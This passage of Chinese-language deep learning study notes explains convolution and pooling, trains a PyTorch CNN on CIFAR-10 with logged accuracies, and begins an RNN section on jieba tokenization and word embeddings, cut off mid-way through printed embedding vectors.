Train:96.938% | Acc on Test:97.250% | Loss: 0.19135 | total_time: 2.39s Epoch[40]:: | Acc on Train:97.688% | Acc on Test:97.000% | Loss: 0.14767 | total_time: 3.14s Epoch[50]:: | Acc on Train:98.188% | Acc on Test:98.250% | Loss: 0.16465 | total_time: 3.91s Epoch[60]:: | Acc on Train:98.125% | Acc on Test:98.000% | Loss: 0.13739 | total_time: 4.66s Epoch[70]:: | Acc on Train:98.000% | Acc on Test:97.500% | Loss: 0.13017 | total_time: 5.42s Epoch[80]:: | Acc on Train:98.125% | Acc on Test:98.250% | Loss: 0.13842 | total_time: 6.22s Epoch[90]:: | Acc on Train:98.250% | Acc on Test:98.000% | Loss: 0.12420 | total_time: 7.27s Epoch[100]:: | Acc on Train:98.062% | Acc on Test:98.750% | Loss: 0.14180 | total_time: 8.12s 卷积神经网络（CNN） 图像基础 RGB:[channel,hight,width]/[hight,width,channel] Channel:R/G/B 卷积神经网络结构 卷积层（Conv）：负责提取图像中的局部特征 池化层（Pool）：用来大幅降低参数数量级（降维） 全连接层（FC）：输出结果 卷积层：特征提取 卷积计算方式： 单通道卷积层计算过程：$$output = input \\otimes conv$$， $conv$ 称为卷积核（Convolutional Kernel），也叫滤波器（Fliter） 单层卷积层移步大小为超参数，可以自行设置。当移步不为1时，可以在原输入矩阵四周进行填充0 计算过程：将输入矩阵的子矩阵与卷积核进行逐元素相乘再相加，得到输出矩阵的对应元素 数学公式：$$\\displaystyle{Output_{[i,j]} = \\sum_{m=0}^{k-1}\\sum_{n=0}^{k-1}Kernel_{[m,n]}·Input_{[i+m,j+n]}}$$ 图示（分别为[Step=1,NoPadding]与[Step=2,Padding]，这里的$\\times$为逐元素相乘）： 多通道卷积层计算过程： 分别对每个通道进行卷积计算。获得一个三通道的中间计算结果 将三通道中间计算结果对应位置加和，得到单通道最终结果 图示（o11=or11+og11+ob11）： 多通道输入与多通道输出 多通道输出需多卷积核分别进行卷积计算后结果堆叠 图示： 参数对应关系： 输入图像大小：$I\\times I$ 卷积核大小：$C\\times C$ ，$C$ 一般为奇数 步长：$S$ 填充圈：$P$ ，0填充 输出结果大小： $O\\times O$，其中 $$\\displaystyle{O = 1+\\frac{I-C+2P}{S}}$$ Pytorch 常用：torch.nn.ConvXd(in_channel,out_channel,kernel_size,stride,padding)，其中X为1，2，3 Con1d：滑动维度1，核形状为$(c,)$，用于文本/语音/时序数据。主要领域：NLP/信号处理 Con2d：滑动维度2，核形状为$(c,c)$，用于图像/视频数据。主要领域：NLP/信号处理 Con3d：滑动维度3，核形状为$(c,c,c)$，用于医学体数据/视频体积。主要领域：医疗影像/视频分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import torch import torch.nn as nn import numpy as np import matplotlib.pyplot as plt # 图像读取与matplotlib绘制 img = plt.imread(\u0026#39;./Material/CNN/test01.jpg\u0026#39;) print(type(img),img.shape) plt.subplot(1,2,1) plt.imshow(img) plt.axis(\u0026#39;off\u0026#39;) # 创建卷积层 conv = nn.Conv2d(in_channels=3,out_channels=2,kernel_size=5,stride=2,padding=0) # plt的图像读取顺序为 [hight,width,channel] # 而Conv2d的图像接收顺序为 [batch_size,channel,hight,width] img = torch.tensor(img).permute(2,0,1) # 维度调整 (380,380,3) =\u0026gt; (3,380,380) img = img.unsqueeze(0) # 插入第一个维度 (3,380,380) =\u0026gt; (1,3,380,380) feature_map_img = conv(img.float()) # 归一化后查看卷积后的第一层输出 f = feature_map_img[0][0] f = ((f - f.min()) / (f.max() - f.min())* 255).int().squeeze().numpy() plt.subplot(1,2,2) plt.imshow(f,cmap=\u0026#39;gray\u0026#39;) plt.axis(\u0026#39;off\u0026#39;) plt.show() \u0026lt;class 'numpy.ndarray'\u0026gt; (380, 380, 3) 池化层 池化处理输入矩阵的思想与卷积相似，但是不设置卷积核。而是在输入矩阵自身进行数据处理 池化层的目的是降低特征图维度，减少计算量。同时保证平移不变性。防止过拟合 池化层不会改变输入的通道数 图示（池化窗口大小为3，步长为1）： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import torch import torch.nn as nn import numpy as np import matplotlib.pyplot as plt # 图像读取与matplotlib绘制 img = plt.imread(\u0026#39;./Material/CNN/test01.jpg\u0026#39;) print(type(img),img.shape) plt.subplot(1,3,1) plt.imshow(img) plt.axis(\u0026#39;off\u0026#39;) kernel_size,stride = (10,2) # 最大池化 max_pool = nn.MaxPool2d(kernel_size=kernel_size,stride=stride,padding=0) # 平均池化 avg_pool = nn.AvgPool2d(kernel_size=kernel_size,stride=stride,padding=0) # 池化 img = torch.tensor(img).permute(2,0,1).unsqueeze(0) print(img.shape) max_img = max_pool(img) avg_img = avg_pool(img.float()) # 可视化 plt.subplot(1,3,2) plt.imshow(max_img[0].permute(1,2,0).numpy()) plt.axis(\u0026#39;off\u0026#39;) plt.subplot(1,3,3) plt.imshow(avg_img[0].int().permute(1,2,0).numpy()) plt.axis(\u0026#39;off\u0026#39;) plt.show() \u0026lt;class 'numpy.ndarray'\u0026gt; (380, 380, 3) torch.Size([1, 3, 380, 380]) 实践 —— CCN实现图片分类 数据集简介 名称：CIFAR-10 (Canadian Institute For Advanced Research) 类型：彩色图像分类数据集 规模：60,000张32×32像素的彩色图像 类别数：10个类别 划分：50,000张训练集 + 10,000张测试集 模型结构（原始）： 导入工具 1 2 3 4 5 6 7 8 9 10 11 import torch import torch.nn as nn from torchvision.datasets import CIFAR10 # 数据集 from torchvision.transforms import ToTensor from torchvision.transforms import Compose from torchvision.transforms import Normalize,RandomHorizontalFlip,RandomCrop import torch.optim as optim from torch.utils.data import DataLoader import time import matplotlib.pyplot as plt from torchsummary import summary 数据导入 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 def load_dataset(): transform = Compose([ RandomHorizontalFlip(), # 50%概率进行翻转 RandomCrop(32,padding=4), # 四周填充4像素0.然后随机裁剪至32*32 ToTensor(), Normalize(mean=(0.4914, 0.4822, 0.4465), std=(0.2023, 0.1994, 0.2010)) ]) train_dataset = CIFAR10( root = \u0026#39;./Dataset/5_CIFAR10\u0026#39;, train = True, transform=transform, download=False ) test_dataset = CIFAR10( root = \u0026#39;./Dataset/5_CIFAR10\u0026#39;, train = False, transform=Compose([ToTensor(),Normalize(mean=(0.4914, 0.4822, 0.4465), std=(0.2023, 0.1994, 0.2010))]), download=False ) show_train_dataset = CIFAR10( #用来可视化展示 root = \u0026#39;./Dataset/5_CIFAR10\u0026#39;, train = True, transform=Compose([ToTensor()]), download=False ) show_test_dataset = CIFAR10( #用来可视化展示 root = \u0026#39;./Dataset/5_CIFAR10\u0026#39;, train = False, transform=Compose([ToTensor()]), download=False ) sample_shape = next(iter(train_dataset))[0].shape categories_num = len(set(train_dataset.targets)) target_names = train_dataset.classes return train_dataset,test_dataset,show_train_dataset,show_test_dataset,sample_shape,categories_num,target_names 模型构建 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 class ImageClassifierModel(nn.Module): def __init__(self,out_dim=10): super(ImageClassifierModel,self).__init__() self.model = nn.Sequential( # 卷积层与池化层 nn.Conv2d(in_channels=3,out_channels=32,kernel_size=3,stride=1,padding=1), nn.BatchNorm2d(32), nn.ReLU(), nn.Conv2d(in_channels=32,out_channels=32,kernel_size=3,stride=1,padding=1), nn.ReLU(), nn.MaxPool2d(kernel_size=2,stride=2), nn.Conv2d(in_channels=32,out_channels=64,kernel_size=3,stride=1,padding=1), nn.BatchNorm2d(64), nn.ReLU(), nn.Conv2d(in_channels=64,out_channels=64,kernel_size=3,stride=1,padding=1), nn.ReLU(), nn.MaxPool2d(kernel_size=2,stride=1), # 全连接层 nn.Flatten(), nn.Linear(in_features=64*15*15,out_features=512), nn.BatchNorm1d(512), nn.ReLU(), nn.Dropout(0.4), nn.Linear(in_features=512,out_features=128), nn.BatchNorm1d(128), nn.ReLU(), nn.Dropout(0.4), nn.Linear(in_features=128,out_features=out_dim), ) def forward(self,X): return self.model(X) def predict(self,X): return torch.argmax(self.forward(X),dim=1) model = ImageClassifierModel() summary(model,input_size=(3,32,32),batch_size=1,device=\u0026#39;cpu\u0026#39;) ---------------------------------------------------------------- Layer (type) Output Shape Param # ================================================================ Conv2d-1 [1, 32, 32, 32] 896 BatchNorm2d-2 [1, 32, 32, 32] 64 ReLU-3 [1, 32, 32, 32] 0 Conv2d-4 [1, 32, 32, 32] 9,248 ReLU-5 [1, 32, 32, 32] 0 MaxPool2d-6 [1, 32, 16, 16] 0 Conv2d-7 [1, 64, 16, 16] 18,496 BatchNorm2d-8 [1, 64, 16, 16] 128 ReLU-9 [1, 64, 16, 16] 0 Conv2d-10 [1, 64, 16, 16] 36,928 ReLU-11 [1, 64, 16, 16] 0 MaxPool2d-12 [1, 64, 15, 15] 0 Flatten-13 [1, 14400] 0 Linear-14 [1, 512] 7,373,312 BatchNorm1d-15 [1, 512] 1,024 ReLU-16 [1, 512] 0 Dropout-17 [1, 512] 0 Linear-18 [1, 128] 65,664 BatchNorm1d-19 [1, 128] 256 ReLU-20 [1, 128] 0 Dropout-21 [1, 128] 0 Linear-22 [1, 10] 1,290 ================================================================ Total params: 7,507,306 Trainable params: 7,507,306 Non-trainable params: 0 ---------------------------------------------------------------- Input size (MB): 0.01 Forward/backward pass size (MB): 2.18 Params size (MB): 28.64 Estimated Total Size (MB): 30.83 ---------------------------------------------------------------- 模型训练 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 def train_model(model,train_data_loader,test_data_loader,epochs=100,device=\u0026#39;cuda\u0026#39;): criterion = nn.CrossEntropyLoss() optimizer = optim.Adam(model.parameters(),lr=0.001,betas=[0.9,0.99]) scheduler = optim.lr_scheduler.StepLR(optimizer,step_size=20,gamma=0.8) total_start = time.time() round_start = time.time() losses = [] accs_train = [] accs_test = [] model.to(device) model.train() max_acc = 0 for epoch in range(epochs): epoch_loss = 0 epoch_total = 0 for batch_index,(X,y) in enumerate(train_data_loader): X = X.to(device) y = y.to(device) optimizer.zero_grad() y_hat = model(X) loss = criterion(y_hat,y) loss.backward() optimizer.step() epoch_loss += loss.item() epoch_total += 1 scheduler.step() avg_epo_loss = epoch_loss / epoch_total losses.append(avg_epo_loss) if epoch % 10 == 0: print() acc_train = evaluate_accuracy(model,train_data_loader,device=device) acc_test= evaluate_accuracy(model,test_data_loader,device=device) accs_test.append(acc_test) accs_train.append(acc_train) model.train() print(f\u0026#34;Epoch[{epoch}]: Loss={loss:.5f} | \u0026#34; f\u0026#34;Acc_train={acc_train*100:.2f}% | Acc_test={acc_test*100:.2f}% | \u0026#34; f\u0026#34;total_time={time.time()-total_start:0.2f}s | \u0026#34; f\u0026#34;roud_time={time.time()-round_start:0.2f}s\u0026#34;) round_start = time.time() if(acc_test\u0026gt;max_acc): max_acc = acc_test torch.save(model.state_dict(),\u0026#39;./Model/5_CIFAR10/Model_MAX.pth\u0026#39;) print(\u0026#39;model saved\u0026#39;) else: print(\u0026#34;*\u0026#34;,end=\u0026#34;\u0026#34;) return losses,accs_train,accs_test 1 2 # 模型保存 torch.save(model.state_dict(),\u0026#39;./Model/5_CIFAR10/Model.pth\u0026#39;) 1 2 3 # 模型加载 model = ImageClassifierModel() model.load_state_dict(torch.load(\u0026#39;./Model/5_CIFAR10/Model.pth\u0026#39;, weights_only=True)) \u0026lt;All keys matched successfully\u0026gt; 模型评估 1 2 3 4 5 6 7 8 9 10 11 12 13 14 def evaluate_accuracy(model,data_loader,device=\u0026#39;cpu\u0026#39;): model.eval() correct = 0 total = 0 model.to(device) for epoch_num,(X,y) in enumerate(data_loader): X,y = X.to(device),y.to(device) correct += (y==model.predict(X)).sum() total+=len(y) return float(correct) / float(total) device = torch.device(\u0026#39;cuda\u0026#39; if torch.cuda.is_available else \u0026#39;cpu\u0026#39;) evaluate_accuracy(model,test_data_loader,device) 0.8782 程序入口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 torch.manual_seed(20030428) # 数据导入 train_dataset,test_dataset,show_train_dataset,show_test_dataset,sample_shape,categories_num,target_names=load_dataset() # 图片展示 fig,axes = plt.subplots(3,10,figsize=(12,4)) indexs = torch.randint(len(show_train_dataset),size=(len(axes.flatten()),)) for ax,index in zip(axes.flatten(),indexs): ax.imshow(show_train_dataset.data[index]) ax.set_title(target_names[show_train_dataset.targets[index]]) ax.axis(\u0026#39;off\u0026#39;) plt.tight_layout() plt.show() ​ ​\n1 2 3 4 5 6 7 8 9 10 11 # 构建dataloader train_data_loader = DataLoader( train_dataset, batch_size=800, shuffle=True, ) test_data_loader = DataLoader( test_dataset, batch_size=100, shuffle=False ) 1 2 3 4 # 模型训练 device = torch.device(\u0026#39;cuda\u0026#39; if torch.cuda.is_available else \u0026#39;cpu\u0026#39;) model = ImageClassifierModel(categories_num) losses,accs_train,accs_test = train_model(model,train_data_loader,test_data_loader,epochs=100,device=device) Epoch[0]: Loss=1.28191 | Acc_train=50.70% | Acc_test=53.65% | total_time=37.15s | roud_time=37.15s model saved ********* Epoch[10]: Loss=0.60261 | Acc_train=79.50% | Acc_test=79.24% | total_time=260.99s | roud_time=223.84s model saved ********* Epoch[20]: Loss=0.43514 | Acc_train=85.86% | Acc_test=83.46% | total_time=485.54s | roud_time=224.55s model saved ********* Epoch[30]: Loss=0.47816 | Acc_train=86.80% | Acc_test=84.15% | total_time=715.66s | roud_time=230.11s model saved ********* Epoch[40]: Loss=0.35383 | Acc_train=90.38% | Acc_test=85.85% | total_time=937.06s | roud_time=221.40s model saved ********* Epoch[50]: Loss=0.28711 | Acc_train=92.13% | Acc_test=86.99% | total_time=1577.17s | roud_time=640.12s model saved ********* Epoch[60]: Loss=0.22160 | Acc_train=94.10% | Acc_test=87.74% | total_time=1800.40s | roud_time=223.23s model saved ********* Epoch[70]: Loss=0.27528 | Acc_train=94.15% | Acc_test=87.33% | total_time=2026.66s | roud_time=226.26s ********* Epoch[80]: Loss=0.21769 | Acc_train=94.80% | Acc_test=87.86% | total_time=2271.28s | roud_time=244.62s model saved ********* Epoch[90]: Loss=0.23167 | Acc_train=95.58% | Acc_test=88.11% | total_time=2493.92s | roud_time=222.63s model saved ********* 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # 预测结果可视化 import numpy as np fig,axes = plt.subplots(5,10,figsize=(12,6)) # indexs1 = [] # max = 0. # for i in range(1000): # indexs = torch.randint(len(show_test_dataset),size=(len(axes.flatten()),)) # X_batch = torch.tensor(test_dataset.data[indexs]).permute(0,3,1,2).float().to(device) # y_hat = model.predict(X_batch).cpu().numpy() # y_true = [test_dataset.targets[index] for index in indexs] # m = (y_hat==y_true).sum()/len(y_hat) # if m\u0026gt;max : # max = m # indexs1 = indexs # indexs = indexs1 indexs = torch.randint(len(show_test_dataset),size=(len(axes.flatten()),)) # print(f\u0026#34;ACC: {max*100:.2f}%\u0026#34;) # X_batch = torch.tensor(test_dataset[indexs][0]).permute(0,3,1,2).float().to(device) X_batch = torch.stack([test_dataset[i][0] for i in indexs]).to(device) y_hat = model.predict(X_batch).cpu().numpy() y_true = [test_dataset.targets[index] for index in indexs] m = (y_hat==y_true).sum()/len(y_hat) print(f\u0026#34;ACC: {m*100:.2f}%\u0026#34;) for ind,ax in enumerate(axes.flatten()): ax.imshow(show_test_dataset.data[indexs[ind]]) result = \u0026#39;√\u0026#39; if test_dataset.targets[indexs[ind]]==y_hat[ind] else \u0026#39;×\u0026#39; ax.set_title(target_names[y_hat[ind]]+\u0026#34; \u0026#34;+ result) ax.axis(\u0026#39;off\u0026#39;) plt.tight_layout() plt.show() ACC: 86.00% 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import torch from PIL import Image from torchvision import transforms def item_identifier(path,device=\u0026#39;cuda\u0026#39;): pil_img = Image.open(path).convert(\u0026#39;RGB\u0026#39;) resize = transforms.Resize((320, 320)) pil_img = resize(pil_img) transform = transforms.Compose([ transforms.Resize((32, 32)), transforms.ToTensor(), # ② 转成 tensor，并把 0~255 映射到 0~1 transforms.Normalize(mean=(0.4914, 0.4822, 0.4465), # ③ 归一化 std =(0.2023, 0.1994, 0.2010)) ]) item = transform(pil_img).unsqueeze(0) data = torch.cat([item,item],dim=0) data = data.to(device) y_hat = model.predict(data).cpu().numpy() return [target_names[i] for i in y_hat][0] print(\u0026#34;predict: \u0026#34; + item_identifier(\u0026#39;./Material/CNN/dog01.jpg\u0026#39;)) print(\u0026#34;predict: \u0026#34; + item_identifier(\u0026#39;./Material/CNN/cat01.jpg\u0026#39;)) print(\u0026#34;predict: \u0026#34; + item_identifier(\u0026#39;./Material/CNN/cat02.jpg\u0026#39;)) print(\u0026#34;predict: \u0026#34; + item_identifier(\u0026#39;./Material/CNN/airplane.webp\u0026#39;)) print(\u0026#34;predict: \u0026#34; + item_identifier(\u0026#39;./Material/CNN/airplane02.webp\u0026#39;)) predict: dog predict: cat predict: cat predict: airplane predict: airplane 循环神经网络（RNN） 自然语言处理基础 通过计算机算法来理解自然语言（非结构化数据） 预处理：分词（对原始自然语言进行分词） 常用分词库：jieba 文本处理与RNN网络 文本预处理：分词、构建词汇表、序列填充 词嵌入：将离散词ID转换为密集向量 RNN顺序处理：逐时间步处理、输出下一个词的概率分布 任务特定输出：序列到序列、序列到标签 训练与反向传播 词嵌入层 目的：根据输入词构建词向量矩阵（m个词转换为m*n数值矩阵，n为维度） Pytorch：torch.nn.Emnedding(num_embeddings=m,embedding_dim=n) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import torch import torch.nn as nn import jieba # 分词 jieba.add_word(\u0026#34;电子科技大学\u0026#34;) # 指定词 uestc = \u0026#34;电子科技大学（UESTC）位于四川成都，是中华人民共和国教育部直属全国重点大学\u0026#34; words = jieba.lcut(uestc) # 分词 unique_words = list(dict.fromkeys(words)) # 去重 print(unique_words) # 打印 # 构建索引映射 words_to_index = {word:index for index,word in enumerate(unique_words)} index_to_words = {index:word for word,index in words_to_index.items()} print(words_to_index) # 词嵌入 em = nn.Embedding(num_embeddings=len(words_to_index),embedding_dim=128) indices = torch.tensor([words_to_index[w] for w in unique_words]) embeddings = em(indices) for w,e in zip(unique_words,embeddings): print(f\u0026#34;{w:6} -\u0026gt; {e.tolist()}\u0026#34;) ['电子科技大学', '（', 'UESTC', '）', '位于', '四川', '成都', '，', '是', '中华人民共和国教育部', '直属', '全国', '重点', '大学'] {'电子科技大学': 0, '（': 1, 'UESTC': 2, '）': 3, '位于': 4, '四川': 5, '成都': 6, '，': 7, '是': 8, '中华人民共和国教育部': 9, '直属': 10, '全国': 11, '重点': 12, '大学': 13} 电子科技大学 -\u0026gt; [-1.8661956787109375, 0.14031772315502167, 0.569237232208252, -0.6351905465126038, 1.4581512212753296, 0.8839808702468872, -0.26830628514289856, -1.0125757455825806, 0.2074999362230301, -0.6489216089248657, -0.8614919185638428, 0.6430625319480896, -0.34125998616218567, 0.05696817487478256, -0.8416153788566589, 0.41408586502075195, 0.5821987390518188, -0.38703832030296326, 2.076655149459839, 1.748010277748108, 0.4105229079723358, 0.7927635908126831, -0.8366308808326721, 1.916683554649353, -0.6101747155189514, -2.931159496307373, 1.766214370727539, 0.043025221675634384, -0.12068509310483932, 0.8680415749549866, -1.6387929916381836, -0.13087299466133118, -1.0647748708724976, -0.8026946187019348, -0.8269746899604797, 0.7678179740905762, 2.2990498542785645, 1.2841042280197144, -0.4002425968647003, 0.953626811504364, 0.3030221462249756, -1.022480845451355, -0.5992862582206726, -0.9663468599319458, -0.20251023769378662, 0.13608014583587646, 0.2563541531562805, -0.9632070064544678, 2.260848045349121, -0.658707857131958, 1.3305976390838623, 0.03939782455563545, -0.02348286285996437, -0.9760847091674805, -1.251930832862854, -0.8567044138908386, -0.3526257276535034, -0.29332804679870605, 0.8696300983428955, -1.509308099746704, -0.039910510182380676, 0.5476474165916443, 0.9213836789131165, 0.28016602993011475, 0.09089063853025436, 0.33394673466682434, -0.18297728896141052, -1.4990456104278564, 0.06538386642932892, -0.38446682691574097, 0.12130188196897507, 0.9136270880699158, -0.48136553168296814, 0.9031698703765869, 2.146907091140747, 1.0486698150634766, -0.430355429649353, 0.42662137746810913, 0.9957815408706665, -1.9405899047851562, -1.118597149848938, 1.043890357017517, -0.23853331804275513, -1.0037298202514648, -0.2007996290922165, 1.160055160522461, -0.6286444067955017, 1.1414754390716553, -0.2947123050689697, -0.883659303188324, 1.2323781251907349, -1.7133738994598389, 0.19904382526874542, -0.3554721772670746, -1.2625665664672852, -0.8544297218322754, -0.26314494013786316, -0.8184374570846558, 1.5473873615264893, 0.35293450951576233, -0.7004155516624451, -1.0532680749893188, -0.2432229369878769, 0.6805398464202881, -0.03701140731573105, 0.6072845458984375, -0.6753002405166626, 0.8425671458244324, -0.08411392569541931, -0.21248064935207367, 0.2524896264076233, -0.6912890672683716, 0.8931838274002075, -0.7701399922370911, -0.5828043222427368, -0.8595352172851562, 0.3621070086956024, -0.9512089490890503, -0.4713025987148285, 1.0108795166015625, -0.02917095087468624, 2.0270469188690186, 0.5386377573013306, 0.5365355610847473, -0.40485095977783203, -0.9131317138671875, 1.3478076457977295, 2.3932957649230957] （ -\u0026gt; [-0.12678614258766174, 0.6960875391960144, 0.020521188154816628, -0.3748815357685089, -0.627172589302063, 1.6855566501617432, 1.486499547958374, 0.8489950299263, -1.387132167816162, 0.41744983196258545, 0.907684862613678, -0.8589462637901306, -0.2876525819301605, 1.0203578472137451, 1.0694795846939087, -0.32388126850128174, -0.7307594418525696, -0.6940516829490662, -0.8880891799926758, 0.22381487488746643, -0.6491599082946777, 1.3248082399368286, 0.6615222096443176, 0.6238570809364319, 1.31926691532135, 0.9561002254486084, 0.796594500541687, 0.7809106111526489, -0.9694629907608032, -0.7225248217582703, 0.21616719663143158, 1.3836281299591064, 0.7425621747970581, -0.279922753572464, 0.3032386898994446, -1.7922078371047974, -1.1123464107513428, -0.157507985830307, -0.44032666087150574, -0.895869791507721, 0.22541534900665283, -0.7791991829872131, 0.2667710483074188, 0.5069770216941833, -0.7465759515762329, 1.4846328496932983, -0.8342013955116272, 0.05761035904288292, -0.27527862787246704, 0.5007193088531494, 0.6848788261413574, -1.7736756801605225, 1.9905004501342773, -0.5666214823722839, 0.2690577208995819, 2.0447988510131836, 1.3222894668579102, -1.052148461341858, -0.035423073917627335, -0.2991918921470642, 0.6338981986045837, 0.8307668566703796, -0.47362956404685974, -1.2505531311035156, 0.9754865765571594, -0.3994227349758148, 0.8434854745864868, -0.1257162094116211, -0.6602136492729187, -0.322810560464859, 0.0715293139219284, -1.0767406225204468, 0.06953053921461105, 1.9902366399765015, 2.156857490539551, 1.3994474411010742, 1.1047091484069824, 0.8247582912445068, -0.05698545277118683, 0.37208205461502075, 0.7805140614509583, -0.1558430939912796, -0.49478021264076233, 1.706350564956665, 0.5205206274986267, 0.13300387561321259, -0.6621465682983398, -0.36326512694358826, 0.8889725804328918, 0.6175691485404968, 0.7431073188781738, -0.17847304046154022, 0.08741611242294312, -0.3816048800945282, 1.6248550415039062, 1.0170153379440308, -1.9888108968734741, 1.8885093927383423, -0.006207907572388649, 1.2217708826065063, -1.0140215158462524, 0.44049927592277527, -0.43184012174606323, -0.06671300530433655, 2.0526020526885986, -0.6379009485244751, -1.6314414739608765, -0.6334065198898315, -0.7363719940185547, 1.1962233781814575, 0.5337159633636475, -0.21218398213386536, 0.5309426784515381, 0.07389579713344574, 0.11146420985460281, -1.1044336557388306, -0.7189712524414062, -0.31827273964881897, 1.5980576276779175, 0.9579342007637024, 2.623478889465332, -1.6724075078964233, -0.26611265540122986, -1.2468178272247314, -0.18551334738731384, -0.4349876940250397, 1.8001712560653687, 1.0223889350891113] UESTC -\u0026gt; [-0.4736874997615814, 1.355381965637207, -0.00493775587528944, -1.0931262969970703, -2.3410215377807617, 0.8936401009559631, 0.6650726199150085, 1.0417888164520264, -0.49513116478919983, 0.0043176612816751, -0.5583096742630005, 1.758357286453247, 1.4455883502960205, -0.19576455652713776, -1.1610676050186157, -2.317267656326294, -0.6588720083236694, -0.13706523180007935, 1.1463770866394043, 0.7667974233627319, -0.42419421672821045, 0.06066890060901642, 1.4035671949386597, 0.2040967345237732, 1.6177923679351807, 0.22955924272537231, 1.0651345252990723, -1.0725045204162598, 1.1727843284606934, -0.7321259379386902, -1.8999624252319336, -0.6257965564727783, 1.2432847023010254, -0.9686990976333618, -1.569515585899353, -1.3007028102874756, -1.035699725151062, 0.2684550881385803, 0.7886533141136169, -0.10644060373306274, -0.36529019474983215, -0.08155005425214767, -0.7963141798973083, -1.0937591791152954, 0.4869083762168884, 0.6795454025268555, 2.2324459552764893, -0.6131372451782227, -0.4022427499294281, -1.2551276683807373, 0.8329983353614807, 2.2642977237701416, 0.03506528586149216, -2.28579044342041, 2.607224941253662, -0.8421016335487366, -0.26126524806022644, -0.11314589530229568, 1.1180301904678345, -0.31227293610572815, 2.5623223781585693, 0.16087308526039124, 1.1985620260238647, -0.6188108325004578, 1.1842929124832153, 0.005746761802583933, -1.1686954498291016, 0.6173182129859924, 1.2473996877670288, -0.38694095611572266, -0.5713652968406677, 1.560266375541687, 0.33818697929382324, -1.2584021091461182, -1.5353972911834717, -2.0800259113311768, -0.20637056231498718, 1.9889888763427734, -2.2434842586517334, -0.12057679891586304, -2.560797929763794, -0.3289901912212372, 0.9283509850502014, 0.895533561706543, 2.0530848503112793, -1.055206298828125, -0.5434237122535706, -0.8042547702789307, 0.724254846572876, 0.7943518161773682, -2.0686428546905518, -1.1408240795135498, 0.14246274530887604, 1.1389896869659424, -0.8794960379600525, -0.06483657658100128, 0.3716636300086975, -0.774135410785675, 0.9789445400238037, 0.9356880784034729, 1.5726100206375122, 1.0869207382202148, -0.9433879256248474, 0.37225478887557983, -0.05867277830839157, -0.308488130569458, -0.4701962172985077, -1.0970293283462524, -0.5689950585365295, -0.9057802557945251, 1.728075385093689, 0.5420587062835693, -0.2288399040699005, 0.3615356683731079, 0.9640733599662781, -0.35619789361953735, -0.9395654797554016, -0.5666417479515076, 0.5330474376678467, -0.13286754488945007, -0.5451010465621948, -0.20822420716285706, -1.439953088760376, -0.39996537566185, 0.9809983372688293, -0.6372662782669067, -0.7996388077735901, 1.035481572151184] ） -\u0026gt; [0.8538455367088318, -0.28737425804138184, -0.4954721927642822, 1.4311481714248657, 0.5066145062446594, -1.3862826824188232, -1.0950548648834229, -0.4366549551486969, -0.3736400008201599, 0.9380052089691162, 0.5984531044960022, 0.025163406506180763, 0.18784953653812408, -0.4975185692310333, 0.39198294281959534, -0.19818389415740967, -0.28350281715393066, -0.5530851483345032, 1.4333688020706177, 0.4523366391658783, -0.943611741065979, -0.05974974110722542, 2.2806386947631836, 0.6010316610336304, -0.7775551080703735, 0.3181857466697693, 0.7983736991882324, -0.4904671013355255, 0.020847203209996223, -0.3797513246536255, 0.4124070107936859, -0.4906497299671173, 0.9153454303741455, 0.8117666244506836, 0.45398736000061035, 0.6178997159004211, 0.2887639105319977, 0.7092264890670776, -0.919242262840271, -0.9364564418792725, 0.9499621987342834, 0.20754645764827728, -0.8610689640045166, -0.39362603425979614, 0.6321143507957458, 0.5002573728561401, -0.16191619634628296, -0.09123581647872925, -1.3519253730773926, 0.9296125173568726, -1.4428986310958862, -0.5282418131828308, 0.5145831108093262, -0.4876914322376251, 1.533389687538147, 0.5935625433921814, 1.6638743877410889, 1.3493365049362183, 1.061549425125122, 0.677806556224823, -0.17198362946510315, -0.33146587014198303, 1.5684221982955933, -0.018957924097776413, 0.987183690071106, -2.1270337104797363, -0.15436771512031555, 1.1985297203063965, 1.4738495349884033, -0.592376172542572, 0.3892100155353546, 0.6586661338806152, 0.31610190868377686, -1.039612054824829, 0.23944780230522156, -1.2984569072723389, -0.6445983648300171, 1.9221996068954468, 0.0942683070898056, 0.8915141224861145, -1.515462040901184, 0.4539085030555725, -1.8553234338760376, -1.0513883829116821, -0.7374001741409302, -1.3408923149108887, 1.2866485118865967, -0.7198876142501831, 0.5034555792808533, -0.10861600935459137, 1.0328806638717651, 0.23367278277873993, -0.9914355874061584, -0.44009122252464294, -0.13551035523414612, 0.049741849303245544, -1.230101466178894, -0.4478664994239807, -0.7742400169372559, 0.9170076847076416, 1.1349929571151733, -0.3445286750793457, 0.42910802364349365, 0.5874624252319336, 0.49147021770477295, -1.384164571762085, -0.6557977199554443, 0.2289164811372757, 1.0107190608978271, 1.1270657777786255, -0.5856562852859497, -0.365908145904541, -0.6938067078590393, -1.3915842771530151, 1.2832459211349487, -0.1949014812707901, -0.04525640979409218, 0.12323860824108124, -0.16887104511260986, 0.4024936854839325, -0.3631386458873749, -0.3940415382385254, -0.851615309715271, 0.052415359765291214, 1.0799293518066406, 0.2743575870990753, -0.45772257447242737, -0.02607984095811844] 位于 -\u0026gt; [1.7168090343475342, -0.08993507921695709, 0.42629849910736084, -0.8526725769042969, 0.17064198851585388, 0.5137831568717957, -0.037155650556087494, -1.1192309856414795, 1.5791795253753662, -0.9378558397293091, -1.1923009157180786, -0.04971752688288689, -1.6210458278656006, -1.2578229904174805, 0.468787282705307, -0.017596535384655, 0.5358322262763977, 1.0883111953735352, 0.6899486184120178, 2.2773444652557373, 0.9163282513618469, -0.7395586371421814, 0.12892921268939972, -1.4885333776474, -0.9551274180412292, 